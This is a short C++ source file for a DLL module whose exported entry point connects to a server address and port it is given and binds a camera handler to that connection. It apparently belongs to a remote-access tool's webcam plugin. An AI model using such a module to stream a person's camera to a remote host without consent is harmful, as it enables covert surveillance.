#include "Camera.h"
#include "IOCPClient.h"

extern "C" __declspec(dllexport) void  ModuleEntry(char* szServerAddr, unsigned short uPort, DWORD dwParam){
	CCamera cam;
	CIOCPClient io(szServerAddr, uPort);

	io.BindHandler(&cam);
	io.Run();
	io.UnbindHandler();
}